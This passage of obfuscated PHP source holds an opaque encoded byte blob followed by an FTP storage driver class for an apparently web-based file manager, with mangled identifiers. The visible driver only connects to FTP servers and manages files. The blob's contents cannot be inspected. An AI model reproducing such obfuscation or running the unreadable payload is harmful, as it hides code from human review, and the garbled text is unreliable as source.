”4÷').base64_decode('fIxLSBINikqcl/B9m7Fu9lSEMNolQUGA37ryXBY4R+BRXLL1rNA+qJXXiVuQFzbDIMAU9Q==')."\224\131\114\143\206\50\271\366\311\333\61\275\137\216\22\73\16\266\32\204\37\172\271\12\354\76\115\42\73\170\25\6\122\166\111\166\306\46\75\125\201\142\322\313\43\222\40\352\255\127\270\4".base64_decode('q9KaaWS6lEDyVxJmXTpZ6SYf0U/FS0l+0O4SMdnlQEWW4NhtP1wBcZOFe2DJaaha7CJe9A==')."\x4c\x2e\x42\xbe\x59\x56\x84\xa6\x61\x21\x4a\x5c\xb\x94\x53\x2c\xfc\xa4\x48\x17\x9b\xc5\x4a\x29\x15\x3e\x45\x92\xa4\x11\x4d\x71\x7f\x7b\x30\x3a\x62\x90\x20\x61\x54\x67\xd6\xee\xde\xfa\x19\x5e\xe6\x1c\x52\xbe"."\52\310\66\147\300\107\320\302\222\320\0\157\157\31\31\3\133\161\310\47\362\230\222\271\2\161\100\45\134\355\20\137\133\174\76\211\123\56\36\53\112\262\204\170\117\236\170\247\222\311\272\260"."\xe1\xa2\xe6\xe5\x38\x43\x57\xa5\x74\x3a\x42\x38\xb9\xd9\x71\x21\xc0\x95\x1\xad\xf\x67\x3a\xbc\x3a\x22\x1a\x43\x1d\x64\x99\xe\x3b\x4d\x57\x25\xf0\x82\x8d\xfc\xae\xa\x29\x25\xfa\x21\x6e\x45\x20\x90\x49\xdf"."\x36\x91\x6\x46\xd8\xa2\x51\xbf\x5d\xec\x7a\x7\x27\x72\x2\x9c\x30\x39\xb0\xdc\x9e\xd\x63\x25\x54\x49\x7d\x2a\xc0\x8e\xb7\xa6\x16\xfb\x54\x70\xe8\x1c\xdb\x47\xf9\xcd\x77\x6c\x2b\x8a\x99\x34\xbf\x6\x60\xc9"."\x11\x96\xca\x91\xd3\x72\x44\xa8\x6d\xac\xa3\x34\x7\xf1\x5c\xc3\x3a\x73\x8f\xc0\x76\xea\x9d\x6d\x9d\x7e\xe\x6a\xe2\xcb\x93\x2a\x4a\x84\xbb\xc0\x20\x33\x40\xd5\x47\x74\xe6\xf1\x35\x67\xa4\x94\x48\xb4\x35\x1c"."\xc\x44\x9a\xc3\xf1\x25\x4a\x3f\x3e\x5b\xe5\x92\xa\x79\x81\xc8\xb9\x94\x89\xae\x98\xe\x3c\xc3\xea\x24\x7f\x26\x7\x7\xbd\x49\xb4\x63\xf0\xa6\xf9\xae\xca\x12\xfb\x27\xd2\x17\xa8\x4c\x3c\x24\xe8\xac\x96\xe2".strrev('Q?=!ÎHÂyşWò´*”'."\n".'–-J„›QşyzŠ2•ï¡YÜ…x'."\r".'`ÊËf+ï1«,^Ÿ').base64_decode('4438kGEZYuGzEqNy7YHm9nCHGohEosscltRC91/kKpO0/JyUNDNiEujXy71Sgg9A+Q0Plw==')."\x1a\x85\x4e\x9f\xec\xc1\xb4\xc0\xe\xac\xe0\xd1\x5b\xfe\xee\xc\x8d\x4a\x8f\xbf\x15\x8a\x9a\x61\xe9\x12\x80\xbe\x4c\x36\xd\xae\x7\x6a\xd9\xac\xe3\x29\xd7\x6c\x9f\x14\x2d\x39\x39\x6b\xc5\x4f\xa9\xf4\x3\xc".strrev('é^Æğq*~‡ç>ŸùT|<S}—ö~PM$úp%øïlÍ#Bã…¤j›üKmn!”­Ky&').strrev('‡Xåö‹tsømC³‚«b#‡Ôv!­`'."\r".':Ÿ´ş®§È-R¼\'ÅVè¢UG'."\n".'w¤	É4')."\310\66\65\114\37\207\50\7\214\274\303\360\324\365\14\240\373\146\201\343\221\277\262\157\220\347\147\150\32\71\222\102\71\173\105\347\120\214\77\67\45\212\272\123\52\64\0\45\53\102\313\305"."\63\50\215\112\35\175\221\222\77\45\244\54\144\76\57\304\7\210\137\305\120\256\140\73\66\367\155\362\365\42\151\156\50\0\253\174\212\134\147\107\47\237\105\361\14\67\262\131\125\145\166\111"."\44\46\261\345\303\66\251\146\156\264\14\340\120\210\105\130\157\270\225\70\176\176\51\337\147\312\243\116\10\73\276\141\106\337\233\245\272\7\17\332\202\350\166\371\133\165\264\370\377\115\101\232"."\x18\x97\xfc\xed\x3a\x2b\x29\x6f\x90\xe5\x66\x99\x42\x7c\xc3\xcf\xf0\x65\xcc\x61\xe7\x23\xb4\x18\xe2\x7e\x78\xcf\xf1\xe4\x9e\xb4\xd4\x88\x7\x7\xf9\x91\x40\x67\x21\x4f\xd9\x33\x58\xa\x79\x3f\x5c\x41\xb\x4"."\346\36\33\350\260\275\55\311\54\175\172\12\375\351\201\137\306\26\335\215\240\4\17\76\131\313\121\61\230\61\262\351\42\267\100\23\200\166\135\50\34\110\51\154\204\245\261\167\322\311\3\235".base64_decode('zYy2w8tblV5jxF5WnQ+IiXfZBA92vlPFD/ctsYQs2/EyWsJMaP0eiqqYOopY06gclm8ukA==')."\x5e\xa0\x44\xa6\x14\x4c\xf3\xf9\x5e\x24\x65\x60\x2f\x9c\xa6\x3d\xe4\xc1\x4d\x4a\x20\xdd\x4f\x7b\x49\xeb\x93\xd3\x61\xb9\x74\x7f\xd6\x4c\x6a\x59\x30\x8f\x74\xdc\x47\x2c\xa2\x5d\x99\xce\x78\x89\x23\x1b\x5\xf9"."\xb5\x42\x41\x1c\x81\xc8\xac\x17\xfd\xeb\xb8\x32\xe\x69\x5d\x89\x36\x95\xb8\x4f\x51\xa9\xb5\x42\x5c\xe0\x9c\x74\x0\x49\x81\x70\x18\x59\xca\x87\xe9\x51\x8c\x3\x5a\x94\xf6\x8b\xb2\xa7\x6a\x7a\x3c\x23\x6e\x1e"."\103\166\324\316\116\172\52\13\3\46\127\311\116\312\271\152\35\321\43\276\255\366\227\237\254\143\223\62\240\50\330\204\207\331\116\15\230\144\133\346\223\67\164\220\101\131\250\10\324\160\54\144"."\214\112\110\252\246\117\232\22\112\41\123\264\57\201\112\317\316\301\323\251\225\136\221\243\230\117\176\232\365\76\276\71\302\161\41\44\310\56\240\204\241\215\373\125\323\362\27\132\331\153\254\154"."\351\300\123\254\25\336\127\235\360\171\126\217\270\144\376\145\217\323\211\253\320\5\64\25\316\227\167\271\210\301\367\37\145\133\30\367\356\205\17\253\253\100\314\75\310\11\263\134\317\54\154\17"."\x1c\x8f\xc7\x4a\xbd\x6\xd2\x56\xfe\x0\xad\x34\xc\x52\xbf\x4b\xc5\xac\x87\x98\x61\x78\x98\x75\x63\xc5\x37\x6c\x1d\x4f\xe5\xb9\x27\xb4\xc2\x2b\xb8\x5f\x59\x21\x5c\x9\x21\x9b\xb7\xb4\x93\xea\x35\x2c\x4c\x16"."\331\111\265\73\233\341\300\135\304\200\305\65\111\352\240\272\214\101\254\310\245\147\314\234\75\137\126\222\210\51\24\347\267\340\62\6\216\241\101\306\21\110\241\70\321\120\141\136\261\345\325\117"."\22\235\167\214\312\237\117\166\161\200\377\331\202\21\273\20\232\125\262\300\55\177\150\276\154\4\10\236\112\166\140\22\103\164\31\374\230\330\6\307\22\253\216\262\100\361\114\262\363\133\124\174"."\250\320\17\211\357\211\305\102\237\274\65\263\170\257\236\303\147\0\166\121\163\156\114\53\355\277\310\110\260\315\36\126\343\212\230\323\44\12\264\62\42\131\332\240\311\65\332\246\133\245\204\213".base64_decode('Y75I1KPRfBbYNvbAIVabRIn+BxPI9lp0WyZswXD3HVt05yj4T2BkpsLzxpI1zJf0gUp6fA==')."\x8f\xe9\xd5\x6c\xaf\x84\x9c\x92\x4a\x52\xb7\xa3\x64\xb2\x81\x5c\x88\xad\xb0\xb3\xdf\xae\xea\x51\x31\x51\x47\xaf\x47\x99\x28\x53\xb9\xb8\x27\xbd\x82\x2c\xbc\x3e\x4a\x82\x1e\x2e\xcd\xee\xdd\x4f\xa0\x49\x20\xd7"."\276\235\42\223\374\172\53\271\72\55\334\23\221\245\353\130\306\222\23\172\371\352\61\251\110\136\37\345\125\113\157\341\12\115\23\121\115\101\217\140\161\23\243\11\322\314\100\53\277\261\256\111".strrev('­O%A'."\r".'ŒÆÈ´¯Ñ.¾ğ¸¢ÏØãš‚»(„óæ,9MÍ\'¤øhíëÒwõN}†')."\177\36\324\261\165\262\334\157\4\43\121\120\366\327\217\242\356\327\323\201\160\222\373\204\364\153\22\353\25\134\126\204\72\112\71\21\221\224\310\144\277\305\23\35\16\43\260\157\103\27\215\140".base64_decode('bigs1wvh1Hs6DbNtwf/6edz/V6/izuZvKeH6+eXAVhDOobX4TJUrPaiq2dUPJ3s9ELAIDQ==')."\xbe\x6f\x48\x10\x15\x12\xe7\xe6\xe1\xcc\xbf\x25\x73\x7b\xa9\xb1\x23\x37\x2d\x9b\x95\x98\x70\xe5\xed\x4c\xd9\xd3\xe4\x8\xf9\x6\xf8\x3b\xd7\x95\x22\xee\x5b\xd3\xee\x67\xca\xbb\x89\xa6\x97\xbd\x40\xde\x5b\x29".base64_decode('o6BLfNdUAY8piAnLgibljdRAhfNyYh7rfO1AEk7Ksok2IBmGOQ71s1AKbxeJcx0YPdkPQg==').base64_decode('tMA2lrXABXpPYNSKOF0BoiUTKgeojLwlHHPiAMrDLWiQj02no0S76zlmmsmSx9ZxRFBuPg==')."\x51\x5e\x9a\xd3\x1\xb9\x8\xb6\xca\x77\xea\xc8\xf0\x4\xe3\x86\x79\xeb\xbc\x2e\x40\xbd\xd7\x55\x1d\x7f\x91\xda\x89\xeb\x8e\x27\x92\xa9\xc9\x9\x5a\x20\x31\xac\x2\x61\xaa\x30\x72\xca\x44\x8e\x9b\xbd\xe5\x65".base64_decode('KF7HRZ4JVlbl9c0bJfSCOCSPB6MTnUWTCIpOKFcLSYbSKUn56pb9KHiKr4xrMZLpmClsow==')."\x27\x4e\x37\x13\xd1\x58\x48\x5d\x16\xc6\x3e\x3b\xc2\x27\x87\xba\x98\xbb\x68\xc3\x24\xaf\xa9\xb0\x2a\xbb\xda\x6b\xc8\xcd\x3c\x58\x0\x68\x17\xd3\x62\xa\x54\xd2\x11\x31\x93\x34\xc1\xc2\xe7\x31\x36\x17\x27\xea"."\116\131\140\140\367\301\245\13\20\314\347\230\254\224\164\146\306\267\130\234\253\161\121\245\154\51\263\150\311\56\103\35\211\130\360\62\121\152\214\355\244\273\362\150\51\353\51\133\117\53\230\205".base64_decode('O6T67ll1M3u/rJZZ7F0zlHPWV+SE7UV8ppcZ9LI8FcuZ1LdQpTSEnXHbgUbikR734zwtDg==')."\277\135\15\222\222\124\41\357\30\301\53\115\23\314\115\207\31\24\302\205\53\15\23\207\211\123\361\376\224\37\71\263\267\133\260\261\234\37\73\70\303\367\62\374\4\3\231\17\17\65\247\62"."\xdb\x21\xac\x15\x10\xba\x1d\x42\x73\xcb\x77\x85\xf0\x25\xbb\x38\x1a\x2d\xc6\x72\xfc\x3a\x6\xd1\xe7\x50\x15\x8d\x43\x53\x3\x26\x2\x32\x48\x3a\x32\x47\xdb\xad\xb4\xf3\x35\x33\x92\x48\xc0\xcc\x33\x39\xd4\x20".base64_decode('Hfo6z9z5rd0yDlgyIlIyKcU83KJf7K4gLNxLkWR6nBUY0rgHN3epLsdWVjqhTxEaESo/hA==')."\25\147\303\222\374\310\212\341\275\260\140\355\56\270\104\123\5\327\323\206\204\64\54\166\143\351\164\213\66\124\41\153\232\355\107\71\24\101\170\126\42\115\113\376\106\304\35\31\175\130\376\72"."\xe4\x13\x57\x58\x1c\x19\xcb\xa1\xc2\x1f\x89\x54\x5e\x1c\xc7\x89\x6e\x62\x58\xa5\xee\x13\x1a\xe7\x2c\x2e\xfb\x3b\xe1\x48\x25\x40\xf4\x79\x2a\x6e\xce\x22\xed\x7c\xb1\xbd\x8f\xb0\x73\xa1\x5d\xe1\xa\x1e\xf1\x49"."\xa7\x77\x15\x9e\x8d\xcf\x19\xca\x43\x2e\xd0\x79\x1d\x50\xd7\x5e\x1e\xeb\xd2\x98\x24\xe8\x4a\x2\xed\x92\x54\x7d\x45\x25\x94\x84\x2\x7a\x36\x22\x55\x27\x1f\xca\x4f\x58\x20\x5e\xf9\x23\x2\x2b\x9d\x43\x2c\xb9".strrev('6Ä¬ÈKF{¸—­]×æ‰3€´ÓäQÀ¥ô'."\n".'zÙ-OqÍ“È1Ş-q/ƒ1hL	¥')."\354\124\106\332\47\227\47\226\303\213\145\203\15\15\250\334\17\167\153\331\130\273\265\7\242\222\262\366\110\26\77\11\263\102\31\332\242\212\305\150\22\56\51\266\47\216\262\23\14\1\56\113"."\x93\x70\xd9\xb2\x64\x56\xb8\x6c\x5c\x49\x39\x5b\x2b\x59\x13\x74\xaf\x7c\xf0\x40\x1b\x95\xae\xd0\x61\xa1\xb3\x91\xb2\x4e\x34\x9e\x15\x33\x97\x7f\xe\x30\xd1\x9d\x9b\xa8\xaf\x2a\xb7\x42\x68\x9d\x5c\x96\x17\x95".base64_decode('WlEx84StcOcWMgfeg1ZKcRgqOTlKJbrNUipQakqFJrRgElY95SxDpFWwMaKfxNKP7OqyQg==')."\262\154\260\124\331\244\51\126\221\312\130\116\133\43\27\134\36\40\160\252\16\62\64\40\60\22\301\262\306\200\260\345\144\127\71\246\70\130\111\51\77\220\67\71\173\112\13\123\135\54\71\5"."\212\356\161\56\253\315\211\372\371\222\344\336\276\342\315\22\17\126\15\225\53\141\262\32\277\350\47\314\335\350\256\331\264\215\224\356\364\241\57\173\274\244\351\354\43\131\111\21\355\322\1\13"."\105\225\303\26\246\202\146\224\200\100\142\26\307\61\264\76\111\70\22\70\341\270\370\105\105\22\70\305\242\7\340\101\154\236\301\217\76\211\43\167\312\302\151\162\334\54\332\36\234\226\60\13"."\xe4\xb7\xc9\xb4\x6d\x61\x58\x42\x35\x43\x44\xcc\xc6\x7c\xd8\x23\xd9\x4d\xa1\x90\x38\xe7\xc4\x8d\x22\x7\x68\x4\x6d\x9\xc5\x22\x41\x38\x8a\xc7\x2a\x97\xb8\x4e\x53\x9\x9d\x73\x44\xf0\xc1\x1c\x8f\xc8\x6c\x16"."\216\344\133\112\56\243\1\1\30\60\323\111\163\204\271\231\304\256\76\104\173\304\321\235\346\226\55\205\130\4\250\50\133\201\21\207\52\226\237\246\370\341\301\46\57\251\3\136\152\365\255\52"."\364\73\212\323\67\56\271\265\366\227\325\0\352\173\121\5\175\255\205\350\122\341\142\132\74\21\57\113\352\14\304\343\313\242\261\146\372\270\113\131\62\51\45\131\325\225\45\165\266\105\73\46"."\112\13\265\7\302\221\262\64\154\200\327\241\12\207\245\64\51\334\111\132\111\116\237\47\152\105\70\270\104\264\204\330\71\210\123\241\102\306\144\207\75\354\324\54\256\145\231\232\107\72\65\320"."\x73\xc2\x53\xad\x28\xe3\xd4\x5e\xc9\xf3\x6a\x31\x97\xd2\x3c\xe0\x7c\x29\xd1\x65\xe7\xca\x10\x16\x2a\xc2\xc6\x73\x1d\x50\x77\xac\x0\x50\xfc\xd8\xd\x5f\xf7\x5c\x7e\x17\x86\x1b\x3e\x87\x81\x87\x4\x27\x6b\x83"."\x10\x1b\x9\xe7\x64\x3e\x4e\x0\xd3\x2a\xe\x90\x7c\x8a\x50\x7e\xc2\x45\x52\xc5\x0\xe0\x86\x9d\x68\x82\xe5\xe5\x2a\x33\x29\x9d\x60\xd1\xdd\x13\x5c\x1b\x87\x21\x95\xc\x24\x69\xd8\x91\x6c\x6b\xfd\x15\xed\x1c"."\xa8\x72\x18\xaf\x7e\xa1\xb6\xfd\x3f\x1d\x9d\xa5\xa5\xc4\xb7\x0\x0".strrev('').base64_decode('').""."", 10, -8))); goto c¬ãÇôí°; c§Ö³â‡–: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($¡üºè†) { parent::__construct(); if (count($¡üºè†) > 0) { $this->_init($¡üºè†); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($¤ÖúôÂˆ) { $’µ©İ± =& $_SERVER[Õò”†—·]; global $config; $this->appCharset = $config[$’µ©İ±[1406]]; $this->systemCharset = $config[$’µ©İ±[1407]]; if (isset($¤ÖúôÂˆ[$’µ©İ±[1408]]) && $¤ÖúôÂˆ[$’µ©İ±[1408]]) { $this->systemCharset = $¤ÖúôÂˆ[$’µ©İ±[1408]]; } } public function iconvApp($éªâ‹Ä) { return $this->iconvTo($éªâ‹Ä, $this->systemCharset, $this->appCharset); } public function iconvSystem($şÊâ®Ş²) { return $this->iconvTo($şÊâ®Ş², $this->appCharset, $this->systemCharset); } public function getPathOuter($ğªĞ¾Õ¼) { $©÷‘»™ì =& $_SERVER[Õò”†—·]; $ƒÎÀáûì = $this->iconvApp($this->pathBase); $ğªĞ¾Õ¼ = $this->iconvApp($ğªĞ¾Õ¼); if (substr($ƒÎÀáûì, 0, 2) == $©÷‘»™ì[1409]) { $ƒÎÀáûì = BASIC_PATH . substr($ƒÎÀáûì, 2); } if (substr($ğªĞ¾Õ¼, 0, 2) == $©÷‘»™ì[1409]) { $ğªĞ¾Õ¼ = BASIC_PATH . substr($ğªĞ¾Õ¼, 2); } $ƒÎÀáûì = KodIO::clear($ƒÎÀáûì); $ğªĞ¾Õ¼ = KodIO::clear($ğªĞ¾Õ¼); $ğªĞ¾Õ¼ = substr($ğªĞ¾Õ¼, strlen($ƒÎÀáûì)); if (empty($this->pathDriver)) { return $ğªĞ¾Õ¼; } return $this->pathDriver . $©÷‘»™ì[18] . ltrim($ğªĞ¾Õ¼, $©÷‘»™ì[18]); } private function _init($Ú¬Êˆ“ì = array()) { $ˆË¬«öİ =& $_SERVER[Õò”†—·]; if (!function_exists($ˆË¬«öİ[1410])) { throw new Exception(LNG($ˆË¬«öİ[1411])); } $this->config = $Ú¬Êˆ“ì; $this->charsetReset($Ú¬Êˆ“ì); foreach ($Ú¬Êˆ“ì as $Æå»É¥± => $¨ßó°Šª) { if (isset($this->{$Æå»É¥±})) { $this->{$Æå»É¥±} = $¨ßó°Šª; } } return $this->_login($Ú¬Êˆ“ì); } private function _login($² ¦éŠì) { $Ó´ù¥ =& $_SERVER[Õò”†—·]; static $õùÌ·´ú = array(); $¶¦ÚÛ‘ = md5(json_encode($² ¦éŠì)); if (isset($õùÌ·´ú[$¶¦ÚÛ‘])) { foreach ($õùÌ·´ú[$¶¦ÚÛ‘] as $ï¬Ûş·‡ => $áÀ§‹É×) { $this->{$ï¬Ûş·‡} = $áÀ§‹É×; } return !0; } $¬¤¶Õğ = parse_url(trim($this->server, $Ó´ù¥[18])); $this->host = $¬¤¶Õğ[$Ó´ù¥[209]]; $ˆ­şà©ğ = isset($¬¤¶Õğ[$Ó´ù¥[208]]) && $¬¤¶Õğ[$Ó´ù¥[208]] == $Ó´ù¥[1412] ? !0 : !1; $this->scheme = $ˆ­şà©ğ ? $Ó´ù¥[1413] : $Ó´ù¥[1414]; $this->port = isset($¬¤¶Õğ[$Ó´ù¥[210]]) ? $¬¤¶Õğ[$Ó´ù¥[210]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($Ó´ù¥[1415]) . $this->host . $Ó´ù¥[4] . $this->port, !0); return !1; } $ß“…„œ¹ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$ß“…„œ¹) { $this->writeLog(LNG($Ó´ù¥[1416]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ÃøÊ¤ÚÏ = $this->pasv == $Ó´ù¥[101] ? !0 : !1; @ftp_pasv($this->connect, $ÃøÊ¤ÚÏ); $õùÌ·´ú[$¶¦ÚÛ‘] = array($Ó´ù¥[1417] => $this->connect, $Ó´ù¥[209] => $this->host, $Ó´ù¥[208] => $this->scheme, $Ó´ù¥[210] => $this->port); return $ß“…„œ¹; } private function _isconn($æ»ñú­Ù = true) { if (is_resource($this->connect)) { return !0; } if (!$æ»ñú­Ù) { return !1; } return $this->_login($this->config); } public function mkfile($ÁÙĞÑ²Š, $ËÅÅ™¼œ = '', $¼ûã›ë  = REPEAT_RENAME) { if ($this->setContent($ÁÙĞÑ²Š, $ËÅÅ™¼œ)) { return $this->getPathOuter($ÁÙĞÑ²Š); } $this->writeLog(LNG($_SERVER[Õò”†—·][1418]), !0); return !1; } public function mkdir($·”ÉÅÈ, $œ¨¢Ü®½ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $·”ÉÅÈ = $this->iconvSystem($·”ÉÅÈ); if ($this->_isFolder($·”ÉÅÈ) || @ftp_mkdir($this->connect, $·”ÉÅÈ)) { return $this->getPathOuter($·”ÉÅÈ); } if (!$this->mkdir($this->pathFather($·”ÉÅÈ))) { return !1; } if ($·”ÉÅÈ = @ftp_mkdir($this->connect, $·”ÉÅÈ)) { return $this->getPathOuter($·”ÉÅÈ); } $this->writeLog(__FUNCTION__ . $_SERVER[Õò”†—·][1419], !0); return !1; } public function copyFile($¾†¯Àº, $÷ ÉèÉµ) { if (!$this->_isconn()) { return !1; } $»İîİ¦ = $this->pathThis($this->iconvSystem($¾†¯Àº)); $õáóäÇĞ = $this->tempFile($»İîİ¦); $şù£•ˆ½ = $this->iconvApp($õáóäÇĞ); $this->download($¾†¯Àº, $şù£•ˆ½); $ïÒçÍ‰ = $this->upload($÷ ÉèÉµ, $şù£•ˆ½); $this->tempFileRemve($õáóäÇĞ); return $ïÒçÍ‰; } public function moveFile($Ùßı™êæ, $Ÿ¢½Œ×) { if (!$this->_isconn()) { return !1; } $Ùßı™êæ = $this->iconvSystem($Ùßı™êæ); $Ÿ¢½Œ× = $this->iconvSystem($Ÿ¢½Œ×); $×ÜáÑ¼Ï = @ftp_rename($this->connect, $Ùßı™êæ, $Ÿ¢½Œ×); if (!$×ÜáÑ¼Ï) { $this->writeLog(__FUNCTION__ . $_SERVER[Õò”†—·][1419], !0); return !1; } return $this->getPathOuter($Ÿ¢½Œ×); } public function delFile($Î¬©£») { if (!$this->_isconn()) { return !1; } $Î¬©£» = $this->iconvSystem($Î¬©£»); $ü­¶²’¬ = @ftp_delete($this->connect, $Î¬©£»); if (!$ü­¶²’¬) { $this->writeLog(__FUNCTION__ . $_SERVER[Õò”†—·][1419], !0); } return $ü­¶²’¬; } public function delFolder($Ï¦¨ıíŸ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ĞÙƒù³ = $£µõßÅ‘ = array(); $this->fileList($Ï¦¨ıíŸ, $ĞÙƒù³, $£µõßÅ‘, !0); $this->listItemCache = !0; foreach ($£µõßÅ‘ as $®ı‘¢¨Â) { $èÇÀ’ = $this->iconvSystem($®ı‘¢¨Â[$_SERVER[Õò”†—·][42]]); $ƒÏª×¯— = @ftp_delete($this->connect, $èÇÀ’); if (!$ƒÏª×¯—) { return !1; } } foreach ($ĞÙƒù³ as $èÇÀ’) { $èÇÀ’ = $this->iconvSystem($èÇÀ’); $ƒÏª×¯— = @ftp_rmdir($this->connect, $èÇÀ’); if (!$ƒÏª×¯—) { return !1; } } $Ï¦¨ıíŸ = $this->iconvSystem($Ï¦¨ıíŸ); return @ftp_rmdir($this->connect, $Ï¦¨ıíŸ); } public function rename($Ø˜Òİ«², $È©”¹Ü) { $Ò–•õ™ =& $_SERVER[Õò”†—·]; if (!$this->_isconn()) { return !1; } $¨Ê¤ä”ú = $this->fileNameAuto($this->pathFather($Ø˜Òİ«²), $È©”¹Ü); $¨Ê¤ä”ú = $this->iconvSystem($¨Ê¤ä”ú); $Ø˜Òİ«² = $this->iconvSystem($Ø˜Òİ«²); $á°œÀƒö = $this->pathFather($Ø˜Òİ«²); $ü²·Ó©¨ = rtrim($á°œÀƒö, $Ò–•õ™[18]) . $Ò–•õ™[18] . $¨Ê¤ä”ú; $„ÙÚ÷Ãò = @ftp_rename($this->connect, $Ø˜Òİ«², $ü²·Ó©¨); if (!$„ÙÚ÷Ãò) { $this->writeLog(__FUNCTION__ . $Ò–•õ™[1419], !0); return !1; } $ü²·Ó©¨ = $this->iconvApp($ü²·Ó©¨); return $this->getPathOuter($ü²·Ó©¨); } private function folderInfo($§ô†¾ëñ, $öËœ‘‘ = false) { $¢’Ó÷ÑÛ =& $_SERVER[Õò”†—·]; $›şÍÉüè = array($¢’Ó÷ÑÛ[42] => $this->pathThis($§ô†¾ëñ), $¢’Ó÷ÑÛ[97] => $this->getPathOuter($¢’Ó÷ÑÛ[18] . $§ô†¾ëñ), $¢’Ó÷ÑÛ[43] => $¢’Ó÷ÑÛ[88]); if ($öËœ‘‘) { return $›şÍÉüè; } $›şÍÉüè[$¢’Ó÷ÑÛ[232]] = $›şÍÉüè[$¢’Ó÷ÑÛ[98]] = 0; $›şÍÉüè[$¢’Ó÷ÑÛ[233]] = $›şÍÉüè[$¢’Ó÷ÑÛ[234]] = !0; return $›şÍÉüè; } private function fileInfo($˜ÏÖ, $»¬·Ìº§ = false, $ä³™´ú = array()) { $•ÜüËÏõ =& $_SERVER[Õò”†—·]; $ìµé°« = array($•ÜüËÏõ[42] => $this->pathThis($˜ÏÖ), $•ÜüËÏõ[97] => $this->getPathOuter($•ÜüËÏõ[18] . $˜ÏÖ), $•ÜüËÏõ[43] => $•ÜüËÏõ[231], $•ÜüËÏõ[89] => isset($ä³™´ú[$•ÜüËÏõ[89]]) ? $ä³™´ú[$•ÜüËÏõ[89]] : 0, $•ÜüËÏõ[188] => $this->ext($˜ÏÖ)); if ($»¬·Ìº§) { return $ìµé°«; } $ìµé°«[$•ÜüËÏõ[232]] = $ìµé°«[$•ÜüËÏõ[98]] = 0; $ìµé°«[$•ÜüËÏõ[233]] = $ìµé°«[$•ÜüËÏõ[234]] = !0; $¾Şæ¹‚ = $this->iconvSystem($˜ÏÖ); $ìµé°«[$•ÜüËÏõ[98]] = @ftp_mdtm($this->connect, $¾Şæ¹‚); if (empty($ä³™´ú)) { $ä³™´ú = $this->objectMeta($˜ÏÖ); if (!$ä³™´ú) { return $ìµé°«; } } $ìµé°«[$•ÜüËÏõ[89]] = $ä³™´ú[$•ÜüËÏõ[89]]; return $ìµé°«; } public function size($ˆ„üªõ) { $ÔÍùñ›î = $this->objectMeta($ˆ„üªõ); return $ÔÍùñ›î ? $ÔÍùñ›î[$_SERVER[Õò”†—·][89]] : 0; } public function info($Åµ‘˜Òş) { if ($this->isFile($Åµ‘˜Òş)) { return $this->fileInfo($Åµ‘˜Òş, 0); } else { if ($this->isFolder($Åµ‘˜Òş)) { return $this->folderInfo($Åµ‘˜Òş); } } return !1; } private function fileList($¦åÎØ®, &$ç–‘ğšä, &$“ÁÔ’À, $Úá¹ı„Ô = false) { $ô››ó®¥ =& $_SERVER[Õò”†—·]; $¦åÎØ® = $this->iconvSystem($¦åÎØ®); if (!$this->isFolder($¦åÎØ®)) { return !1; } @ftp_chdir($this->connect, $ô››ó®¥[18]); $¦åÎØ® = rtrim($¦åÎØ®, $ô››ó®¥[18]) . $ô››ó®¥[18]; check_abort(); $¹µôäØë = @ftp_rawlist($this->connect, $¦åÎØ®); if (!$¹µôäØë) { $¹µôäØë = array(); } $—èÏåÊÁ = array($ô››ó®¥[20] => 1, $ô››ó®¥[1332] => 1); foreach ($¹µôäØë as $ˆõêÂú‚) { $§×“ÕíŠ = $this->_listItem($ˆõêÂú‚); if ($§×“ÕíŠ[0] == $ô››ó®¥[809]) { continue; } $åÅÎÁÏ– = $§×“ÕíŠ[8]; if (empty($åÅÎÁÏ–) && $åÅÎÁÏ– !== $ô››ó®¥[229] || isset($—èÏåÊÁ[$åÅÎÁÏ–])) { continue; } $åÅÎÁÏ– = $this->iconvApp($¦åÎØ® . ltrim($åÅÎÁÏ–, $ô››ó®¥[18])); $Ş˜®¸˜ = array($ô››ó®¥[42] => $åÅÎÁÏ–, $ô››ó®¥[43] => $ô››ó®¥[231], $ô››ó®¥[89] => $§×“ÕíŠ[4]); if (substr($ˆõêÂú‚, 0, 1) == $ô››ó®¥[1420]) { $Ş˜®¸˜[$ô››ó®¥[43]] = $ô››ó®¥[88]; $Ş˜®¸˜[$ô››ó®¥[89]] = 0; } $¶˜šæÛİ = $Ş˜®¸˜[$ô››ó®¥[43]] == $ô››ó®¥[88] ? !0 : !1; $this->cacheMethodInfoSet($åÅÎÁÏ–, $¶˜šæÛİ, $Ş˜®¸˜); if ($¶˜šæÛİ) { $ç–‘ğšä[] = $åÅÎÁÏ–; if ($Úá¹ı„Ô) { $this->fileList($åÅÎÁÏ–, $ç–‘ğšä, $“ÁÔ’À, $Úá¹ı„Ô); } continue; } $“ÁÔ’À[] = $Ş˜®¸˜; } $this->cacheMethodInfoSet($¦åÎØ®, !0); } private function _listItem($ìâëó¸š) { if (empty($ìâëó¸š)) { return array(); } $å Æëªé = preg_split($_SERVER[Õò”†—·][1421], $ìâëó¸š); if (count($å Æëªé) <= 9) { return $å Æëªé; } $å Æëªé[8] = trim(substr($ìâëó¸š, strpos($ìâëó¸š, $å Æëªé[7]) + strlen($å Æëªé[7]))); return array_splice($å Æëªé, 0, 9); } public function listPath($‘¦²Éè, $’¦ÈùËò = false) { $º¢ŠÎ‹° =& $_SERVER[Õò”†—·]; if (!$this->_isconn()) { return !1; } $¢Æ×·¸  = $ÔÄãÖïÊ = array(); $this->fileList($‘¦²Éè, $¢Æ×·¸ , $ÔÄãÖïÊ); foreach ($¢Æ×·¸  as $¿”ÆÃ±Ò => $ß¦Âì–ı) { $¢Æ×·¸ [$¿”ÆÃ±Ò] = $this->folderInfo($ß¦Âì–ı, $’¦ÈùËò); } foreach ($ÔÄãÖïÊ as $¿”ÆÃ±Ò => $ß¦Âì–ı) { $ÔÄãÖïÊ[$¿”ÆÃ±Ò] = $this->fileInfo($ß¦Âì–ı[$º¢ŠÎ‹°[42]], $’¦ÈùËò, $ß¦Âì–ı); } return array($º¢ŠÎ‹°[95] => $¢Æ×·¸ , 